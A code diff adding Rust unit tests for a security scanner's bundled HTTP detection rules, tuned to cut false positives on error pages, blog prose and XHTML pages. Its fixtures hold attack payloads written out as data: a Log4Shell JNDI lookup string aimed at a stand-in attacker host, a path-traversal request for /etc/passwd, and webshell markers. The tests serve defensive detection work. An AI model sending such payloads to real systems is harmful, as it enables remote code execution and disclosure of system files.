@@ -6604,6 +6604,19 @@ mod tests {
         }
     }
 
+    fn document_with_status(path: &str, body: &str, status: u16) -> FetchedDocument {
+        FetchedDocument {
+            path: path.to_string(),
+            url: format!("https://example.test{path}"),
+            status,
+            content_type: Some("text/plain".to_string()),
+            headers: Vec::new(),
+            body: body.to_string(),
+            truncated: false,
+            coverage_source: "test-seed".to_string(),
+        }
+    }
+
     #[test]
     fn detector_engine_redacts_matches() {
         let engine = DetectorEngine::new();
@@ -7258,24 +7271,33 @@ mod tests {
             .find(|manifest| manifest.name == "bundled-http-plugin-pack")
             .expect("bundled http rule pack manifest");
 
+        // PR-tuned matchers (see PR #53 SwaggerUI shape extended in this PR):
+        // - Browserless requires browserless-specific JSON shape, not just path
+        // - Node-RED requires Node-RED-specific HTML markers
+        // - Traversal requires structurally-valid /etc/passwd-style content,
+        //   not the previous \"<!doctype html public\" catch-all that fired on
+        //   every XHTML 1.0 page.
         let browserless = super::run_external_detector_pack(
             &document(
                 "/json/version",
-                "<html><title>Browserless</title><body>browserless chrome service</body></html>",
+                "{\"Browser\":\"HeadlessChrome/120.0.6099.71\",\"webSocketDebuggerUrl\":\"ws://localhost:3000/devtools/browser/abc\",\"V8-Version\":\"12.0.267.10\"}",
             ),
             &manifest,
         )
         .expect("browserless rule should execute");
         let node_red = super::run_external_detector_pack(
             &document(
-                "/red/settings",
-                "<html><title>Node-RED</title><body>Welcome to Node-RED</body></html>",
+                "/red/",
+                "<html><head><title>Node-RED</title></head><body>node-red editor: <script src=\"/red/red.min.js\"></script></body></html>",
             ),
             &manifest,
         )
         .expect("node-red rule should execute");
         let traversal = super::run_external_detector_pack(
-            &document("/../../../../etc/passwd", "root:x:0:0:root:/root:/bin/sh"),
+            &document(
+                "/../../../../etc/passwd",
+                "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
+            ),
             &manifest,
         )
         .expect("traversal rule should execute");
@@ -7308,11 +7330,13 @@ mod tests {
                 .all(|finding| !finding.matched_signals.is_empty())
         );
         assert!(all.iter().all(|finding| !finding.review_labels.is_empty()));
+        // matched_signals now carry the matched substring as
+        // \"<category>:<substring>\", per PR #53 shape extended to bundled rules.
         assert!(all.iter().any(|finding| {
             finding
                 .matched_signals
                 .iter()
-                .any(|signal| signal == "path_hint")
+                .any(|signal| signal.starts_with("path_hint:"))
         }));
         assert!(all.iter().any(|finding| {
             finding
@@ -7347,6 +7371,413 @@ mod tests {
             .map(|metadata| metadata.plugin_id.as_str())
             .collect::<HashSet<_>>();
         assert!(!plugin_ids.contains("BrowserlessPlugin"));
+    }
+
+    fn http_pack_manifest() -> super::ExtensionManifest {
+        let config = crate::config::AppConfig::default();
+        config
+            .load_extension_manifests()
+            .expect("bundled manifests should load")
+            .into_iter()
+            .find(|manifest| manifest.name == "bundled-http-plugin-pack")
+            .expect("bundled http rule pack manifest")
+    }
+
+    fn fired_plugins(findings: &[FindingCandidate]) -> HashSet<&str> {
+        findings
+            .iter()
+            .filter_map(|finding| finding.plugin_metadata.as_ref())
+            .map(|metadata| metadata.plugin_id.as_str())
+            .collect()
+    }
+
+    /// PR-tuned bundled rules require a 2xx response by default (matches the
+    /// PR #53 SwaggerUI shape). A CDN 404 on a swagger-style or graphql-style
+    /// path must not fire any plugin — historically, scan #21/#25 saw 211/211
+    /// findings on these paths from CDN error pages.
+    #[test]
+    fn bundled_http_rules_skip_non_2xx_responses() {
+        let manifest = http_pack_manifest();
+
+        let cdn_404_graphql = super::run_external_detector_pack(
+            &document_with_status(
+                "/graphql",
+                "<html><body>404 Not Found - Cloudflare edge service hosted page</body></html>",
+                404,
+            ),
+            &manifest,
+        )
+        .expect("graphql 404 rule run");
+        assert!(
+            !fired_plugins(&cdn_404_graphql).contains("GraphQLEndpointPlugin"),
+            "graphql endpoint must not fire on a CDN 404 page"
+        );
+
+        let cdn_403_browserless = super::run_external_detector_pack(
+            &document_with_status(
+                "/json/version",
+                "<html><body>403 Forbidden - access denied at the edge for this resource</body></html>",
+                403,
+            ),
+            &manifest,
+        )
+        .expect("browserless 403 rule run");
+        assert!(
+            !fired_plugins(&cdn_403_browserless).contains("BrowserlessPlugin"),
+            "browserless must not fire on a 403 page"
+        );
+
+        let cdn_500_geoserver = super::run_external_detector_pack(
+            &document_with_status(
+                "/geoserver/web/",
+                "<html><body>500 Internal Server Error - upstream connect timeout at the edge</body></html>",
+                500,
+            ),
+            &manifest,
+        )
+        .expect("geoserver 500 rule run");
+        assert!(
+            !fired_plugins(&cdn_500_geoserver).contains("GeoserverRcePlugin"),
+            "geoserver rce must not fire on a 500 page"
+        );
+    }
+
+    /// The TraversalHttpPlugin previously fired on every XHTML 1.0 page because
+    /// `<!doctype html public` was a regex alternative. Verify that legitimate
+    /// XHTML pages no longer match — and that real /etc/passwd traversal still
+    /// does.
+    #[test]
+    fn bundled_traversal_plugin_skips_xhtml_doctype_pages() {
+        let manifest = http_pack_manifest();
+
+        let xhtml_page = super::run_external_detector_pack(
+            &document(
+                "/some/random/page",
+                "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"><html><body>Random homepage content with no traversal</body></html>",
+            ),
+            &manifest,
+        )
+        .expect("xhtml rule run");
+        assert!(
+            !fired_plugins(&xhtml_page).contains("TraversalHttpPlugin"),
+            "traversal plugin must not fire on XHTML 1.0 doctype pages"
+        );
+
+        let real_passwd = super::run_external_detector_pack(
+            &document(
+                "/cgi-bin/foo?file=../../../etc/passwd",
+                "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
+            ),
+            &manifest,
+        )
+        .expect("traversal positive rule run");
+        assert!(
+            fired_plugins(&real_passwd).contains("TraversalHttpPlugin"),
+            "traversal plugin must fire on real /etc/passwd disclosure"
+        );
+    }
+
+    /// Log4JOpportunistic must not fire on security articles or blog posts that
+    /// merely mention "log4j" or "log4shell" in prose. The exploit is
+    /// distinguished by the literal `${jndi:` marker.
+    #[test]
+    fn bundled_log4j_plugin_skips_security_articles() {
+        let manifest = http_pack_manifest();
+
+        let blog_post = super::run_external_detector_pack(
+            &document(
+                "/blog/log4j-explained",
+                "<html><body>This article explains the log4j vulnerability and the log4shell exploit. Mitigation requires upgrading log4j.</body></html>",
+            ),
+            &manifest,
+        )
+        .expect("log4j blog run");
+        assert!(
+            !fired_plugins(&blog_post).contains("Log4JOpportunistic"),
+            "log4j plugin must not fire on blog posts mentioning log4j by name"
+        );
+
+        // Real exploit echo can land on a 4xx — engine respects the rule's
+        // explicit `status_in: []` opt-out.
+        let real_exploit = super::run_external_detector_pack(
+            &document_with_status(
+                "/api/login",
+                "{\"error\":\"Invalid input\",\"echo\":\"${jndi:ldap://attacker.example.test/exploit}\"}\n.....filler bytes to clear the 50-byte default body floor.....",
+                400,
+            ),
+            &manifest,
+        )
+        .expect("log4j exploit run");
+        assert!(
+            fired_plugins(&real_exploit).contains("Log4JOpportunistic"),
+            "log4j plugin must fire on a real $${{jndi:ldap://}} marker"
+        );
+
+        // Real-world echo replies are often very short (a single header
+        // value reflected back on a 400). Rule must opt out of the 50-byte
+        // body floor via `min_body_bytes: 0`, otherwise it loses these.
+        let short_echo = super::run_external_detector_pack(
+            &document_with_status("/api/v1/login", "${jndi:ldap://x.tld/a}", 400),
+            &manifest,
+        )
+        .expect("log4j short echo run");
+        assert!(
+            fired_plugins(&short_echo).contains("Log4JOpportunistic"),
+            "log4j plugin must fire on a sub-50-byte $${{jndi:ldap://}} echo"
+        );
+    }
+
+    /// MalwareHttpPlugin used to fire on any page mentioning "malware" or
+    /// "webshell" in prose (a security blog, a wikipedia entry). Verify the
+    /// tightened regex requires actual webshell/coinjacker markers.
+    #[test]
+    fn bundled_malware_plugin_skips_security_prose() {
+        let manifest = http_pack_manifest();
+
+        let blog_post = super::run_external_detector_pack(
+            &document(
+                "/articles/malware-trends",
+                "<html><body>Recent malware research shows that webshell techniques like uploading PHP backdoors remain prevalent...</body></html>",
+            ),
+            &manifest,
+        )
+        .expect("malware blog run");
+        assert!(
+            !fired_plugins(&blog_post).contains("MalwareHttpPlugin"),
+            "malware plugin must not fire on prose mentioning the words 'malware' or 'webshell'"
+        );
+
+        // The c99shell/r57shell strings are well-known webshell artifacts —
+        // their presence in a response body is far more indicative of
+        // compromise than a bare 'malware' or 'webshell' keyword.
+        let real_webshell = super::run_external_detector_pack(
+            &document(
+                "/uploads/shell.php",
+                "c99shell.php v.2.0 - filler filler filler filler filler bytes to clear the 50-byte default floor.",
+            ),
+            &manifest,
+        )
+        .expect("real webshell run");
+        assert!(
+            fired_plugins(&real_webshell).contains("MalwareHttpPlugin"),
+            "malware plugin must fire on a known c99shell artifact"
+        );
+
+        // Short artifact strings (e.g., a single banner or header echo) must
+        // still match — same opt-out shape as the log4j rule.
+        let short_artifact = super::run_external_detector_pack(
+            &document("/wp-content/uploads/x.php", "c99shell"),
+            &manifest,
+        )
+        .expect("short malware artifact run");
+        assert!(
+            fired_plugins(&short_artifact).contains("MalwareHttpPlugin"),
+            "malware plugin must fire on a sub-50-byte c99shell artifact"
+        );
+    }
+
+    /// matched_signals must carry the actual matched substring per PR #53
+    /// shape, formatted as ``"<category>:<substring>"`` so reviewers can see
+    /// *why* a rule fired without re-running the plugin.
+    #[test]
+    fn bundled_http_rules_populate_matched_signals_with_substrings() {
+        let manifest = http_pack_manifest();
+
+        let findings = super::run_external_detector_pack(
+            &document(
+                "/json/version",
+                "{\"Browser\":\"HeadlessChrome/120.0.6099.71\",\"webSocketDebuggerUrl\":\"ws://localhost:3000/devtools/browser/abc\",\"V8-Version\":\"12.0.267.10\"}",
+            ),
+            &manifest,
+        )
+        .expect("browserless run");
+        let browserless = findings
+            .iter()
+            .find(|finding| {
+                finding
+                    .plugin_metadata
+                    .as_ref()
+                    .is_some_and(|metadata| metadata.plugin_id == "BrowserlessPlugin")
+            })
+            .expect("BrowserlessPlugin finding");
+        assert!(
+            browserless
+                .matched_signals
+                .iter()
+                .any(|signal| signal.contains("/json/version")),
+            "matched_signals should include the matched path token: {:?}",
+            browserless.matched_signals
+        );
+        assert!(
+            browserless
+                .matched_signals
+                .iter()
+                .any(|signal| signal.starts_with("body_regex:")),
+            "matched_signals should include a body_regex entry: {:?}",
+            browserless.matched_signals
+        );
+    }
+
+    /// Bundled rules must reject bodies under the 50-byte default floor (same
+    /// shape as PR #53's SwaggerUI matcher: tiny `{}` JSON spec bodies must
+    /// not match).
+    #[test]
+    fn bundled_http_rules_skip_tiny_bodies() {
+        let manifest = http_pack_manifest();
+
+        let tiny = super::run_external_detector_pack(
+            &document("/json/version", "{}"),
+            &manifest,
+        )
+        .expect("tiny body run");
+        assert!(
+            !fired_plugins(&tiny).contains("BrowserlessPlugin"),
+            "browserless must not fire on a 2-byte JSON body"
+        );
+    }
+
+    /// PHP exploit-marker rules must opt out of the default 2xx filter via
+    /// `status_in: []` — the markers commonly surface in 4xx/5xx error
+    /// responses (a misconfigured CGI returning 500 with `php-cgi` in the
+    /// body, or a 400 echoing back a `php://input` payload).
+    #[test]
+    fn bundled_php_exploit_rules_match_on_non_2xx_responses() {
+        let manifest = http_pack_manifest();
+
+        let php_cgi_500 = super::run_external_detector_pack(
+            &document_with_status("/cgi-bin/test.php", "php-cgi", 500),
+            &manifest,
+        )
+        .expect("php cgi 500 run");
+        assert!(
+            php_cgi_500
+                .iter()
+                .any(|finding| finding.detector == "php_cgi_rce_best_effort"),
+            "PhpCgiRcePlugin must fire on a 500 response with `php-cgi` body: {:?}",
+            php_cgi_500
+                .iter()
+                .map(|finding| finding.detector.as_str())
+                .collect::<Vec<_>>()
+        );
+
+        let php_stdin_400 = super::run_external_detector_pack(
+            &document_with_status(
+                "/upload.php",
+                "Error: php://input restricted",
+                400,
+            ),
+            &manifest,
+        )
+        .expect("php stdin 400 run");
+        assert!(
+            php_stdin_400
+                .iter()
+                .any(|finding| finding.detector == "php_stdin_best_effort"),
+            "PhpStdinPlugin must fire on a 400 response with php://input echo: {:?}",
+            php_stdin_400
+                .iter()
+                .map(|finding| finding.detector.as_str())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    /// Plugins whose entire signature *is* a short JSON body must opt out of
+    /// the 50-byte default floor with `min_body_bytes: 0`. A 28-byte GraphQL
+    /// error envelope and a 25-byte WordPress user enum response are both
+    /// valid concise signatures that the floor would otherwise drop.
+    #[test]
+    fn bundled_http_rules_short_signature_rules_opt_out_of_body_floor() {
+        let manifest = http_pack_manifest();
+
+        let graphql_error = super::run_external_detector_pack(
+            &document(
+                "/api/graphql",
+                "{\"errors\":[{\"message\":\"x\"}]}",
+            ),
+            &manifest,
+        )
+        .expect("graphql error envelope run");
+        assert!(
+            graphql_error
+                .iter()
+                .any(|finding| finding.detector == "GraphQLErrorEnvelopePlugin"),
+            "GraphQLErrorEnvelopePlugin must fire on a 28-byte error envelope: {:?}",
+            graphql_error
+                .iter()
+                .map(|finding| finding.detector.as_str())
+                .collect::<Vec<_>>()
+        );
+
+        let graphql_introspection = super::run_external_detector_pack(
+            &document(
+                "/api/graphql",
+                "{\"data\":{\"__schema\":{}}}",
+            ),
+            &manifest,
+        )
+        .expect("graphql introspection run");
+        assert!(
+            graphql_introspection
+                .iter()
+                .any(|finding| finding.detector == "GraphQLIntrospectionResponsePlugin"),
+            "GraphQLIntrospectionResponsePlugin must fire on a 24-byte schema response: {:?}",
+            graphql_introspection
+                .iter()
+                .map(|finding| finding.detector.as_str())
+                .collect::<Vec<_>>()
+        );
+
+        let wp_user_enum = super::run_external_detector_pack(
+            &document(
+                "/wp-json/wp/v2/users",
+                "[{\"id\":1,\"slug\":\"admin\"}]",
+            ),
+            &manifest,
+        )
+        .expect("wp user enum run");
+        assert!(
+            wp_user_enum
+                .iter()
+                .any(|finding| finding.detector == "wordpress_user_enumeration_best_effort"),
+            "WpUserEnumHttp must fire on a 25-byte user-enum JSON: {:?}",
+            wp_user_enum
+                .iter()
+                .map(|finding| finding.detector.as_str())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    /// `min_body_bytes` is documented in bytes, not Unicode code points. A
+    /// non-ASCII Node-RED admin body that is 33 characters but 55 UTF-8 bytes
+    /// must clear the 50-byte default floor — measuring it by `len()` would
+    /// wrongly reject CJK/emoji-heavy responses.
+    #[test]
+    fn bundled_http_rules_count_body_bytes_not_code_points() {
+        let manifest = http_pack_manifest();
+
+        // node-red banner + CJK filler:
+        //   "<title>node-red</title>" (23 ASCII bytes / 23 code points)
+        // + 4 × "テスト" (12 CJK code points × 3 UTF-8 bytes = 36 bytes)
+        // = 35 code points / 59 UTF-8 bytes.
+        // Under the buggy len()-based floor (35 < 50), the body would be
+        // rejected; under the correct UTF-8-byte floor (59 >= 50), it matches.
+        let cjk_body = "<title>node-red</title>テストテストテストテスト";
+        assert!(cjk_body.chars().count() < 50, "fixture must be <50 chars");
+        assert!(
+            cjk_body.len() >= 50,
+            "fixture must be >=50 UTF-8 bytes to exercise the bytes-vs-codepoints distinction"
+        );
+
+        let cjk = super::run_external_detector_pack(
+            &document("/red/", cjk_body),
+            &manifest,
+        )
+        .expect("cjk body run");
+        assert!(
+            fired_plugins(&cjk).contains("NodeREDPlugin"),
+            "NodeREDPlugin must fire on a 59-byte CJK body that is 35 code points: {:?}",
+            fired_plugins(&cjk)
+        );
     }
 
     #[test]
